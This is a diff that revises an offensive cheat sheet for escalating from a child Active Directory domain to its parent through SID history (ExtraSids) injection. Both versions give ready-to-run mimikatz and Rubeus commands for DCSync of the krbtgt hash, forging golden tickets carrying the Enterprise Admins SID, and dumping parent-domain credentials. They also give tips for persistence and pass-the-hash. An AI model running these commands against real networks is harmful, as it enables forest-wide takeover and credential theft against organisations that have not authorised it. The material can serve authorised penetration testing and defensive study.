@@ -1,98 +1,79 @@
-## Child to Parent Escalation via ExtraSids
+# Attacking Domain Trusts — Child → Parent (Windows)
 
-Child domain administrative access is established and forest-wide persistence is required; **missing SID Filtering** between domains in the same forest allows the `sidHistory` attribute to be respected across trusts.
+Prerequisite: DA in the child domain. SID filtering is not applied within the same forest, so SID history injection works cross-domain inside the forest.
 
-1. Identify the SID of the compromised child domain and the Enterprise Admins group in the parent domain.
-2. Execute DCSync in the child domain to recover the KRBTGT account NT hash.
-3. Forge a Golden Ticket in the child domain, injecting the parent Enterprise Admin SID into the `ExtraSids` field.
-4. Inject the forged ticket into the current session to gain administrative access to the parent domain.
-5. Verify access by listing the filesystem or performing DCSync against the parent Domain Controller.
+Needed data:
+
+- Child domain `krbtgt` NT hash
+- Child domain SID
+- Parent domain Enterprise Admins group SID
+- Child domain FQDN
+- Any username (doesn't need to exist)
 
 ---
 
-## Enumeration and Data Collection
+## Gather the Required Data
 
-Administrative access in the child domain is required to extract the KRBTGT hash and group SIDs.
-
-Obtain the current child domain SID
+DCSync the child domain's `krbtgt`:
 
 ```
+mimikatz # lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt
+```
+
+Get child domain SID:
+
+```powershell
 Get-DomainSID
 ```
 
-Retrieve the SID for the Enterprise Admins group from the parent domain
+Get Enterprise Admins SID from the parent domain:
 
-```
+```powershell
 Get-DomainGroup -Domain <PARENT_DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
 ```
 
-Execute DCSync to extract the child KRBTGT NT hash
+Enterprise Admins SID always ends in `-519`.
+
+---
+
+## ExtraSids Attack — Mimikatz
+
+Forge the Golden Ticket with `/sids` pointing to Enterprise Admins in the parent domain, inject into current session with `/ptt`:
 
 ```
-lsadump::dcsync /user:<DOMAIN>\krbtgt
+mimikatz # kerberos::golden /user:<FAKEUSER> /domain:<CHILD_FQDN> /sid:<CHILD_SID> /krbtgt:<KRBTGT_HASH> /sids:<EA_SID> /ptt
 ```
 
-Identify the hash and domain SID from the DCSync output to drive ticket forging
+Verify ticket in memory:
 
-```
-Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
-Credentials:
-Hash NTLM: 9d765b482771505cbe97411065964d5f
-```
-
-## Golden Ticket Forging (ExtraSids)
-
-Access to the parent domain is denied until a forged ticket containing the parent's Enterprise Admin SID is injected into memory.
-
-### Mimikatz
-
-Forge and inject a Golden Ticket with ExtraSids for immediate session use
-
-```
-kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<PARENT_EA_SID> /ptt
-```
-
-- Mimikatz -> `kerberos::golden ... /ptt` -> Prefer for all-in-one execution on the target host.
-
-### Rubeus
-
-Forge and inject a Golden Ticket using the RC4 hash
-
-```
-.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<DOMAIN> /sid:<CHILD_DOMAIN_SID> /sids:<PARENT_EA_SID> /user:<USERNAME> /ptt
-```
-
-- Rubeus -> `golden ... /ptt` -> Prefer for C# based execution and better integration with automated post-exploitation frameworks.
-
-## Access Verification and Post-Exploitation
-
-A forged ticket exists in memory and must be validated against parent domain resources.
-
-Confirm the forged ticket is present in the current session
-
-```
+```powershell
 klist
 ```
 
-Test administrative access to the parent Domain Controller filesystem
+Test parent domain access:
 
-```
-ls \\<PARENT_DC_IP>\c$
-```
-
-Execute DCSync against the parent domain to compromise specific accounts
-
-```
-lsadump::dcsync /user:<PARENT_DOMAIN>\<USERNAME> /domain:<PARENT_DOMAIN>
+```powershell
+ls \\<PARENT_DC_FQDN>\c$
 ```
 
-**Dangerous / misconfigured settings**
+---
 
-- `sidHistory` attributes are trusted across domains within the same forest due to the **lack of SID Filtering**.
-- Enterprise Admins group membership is determined by the SID present in the authentication token, regardless of actual group residency.
+## ExtraSids Attack — Rubeus
 
-**Gotchas**
+```powershell
+.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<CHILD_FQDN> /sid:<CHILD_SID> /sids:<EA_SID> /user:<FAKEUSER> /ptt
+```
 
-- **KRBTGT password changes** will immediately invalidate all forged Golden Tickets.
-- **SID Filtering** if enabled across forest trusts will block the `ExtraSids` attribute, causing the escalation to fail.
-- **Target domain mismatch** during DCSync requires the explicit `/domain` flag to point to the parent DC.
+---
+
+## Post-Exploitation
+
+DCSync any user in the parent domain (specify `/domain` explicitly when targeting across trust):
+
+```
+mimikatz # lsadump::dcsync /user:<PARENT_DOMAIN>\<USER> /domain:<PARENT_DOMAIN>
+```
+
+> [!tip] With EA rights via `/sids`, DCSync the parent `krbtgt` → Golden Ticket for the parent domain for persistence. DCSync `administrator` → PTH directly to parent DC.
+
+> [!warning] This attack requires `SIDFilteringQuarantined: False` on the trust — the default for intra-forest trusts. Cross-forest trusts have SID filtering enabled by default and block this.
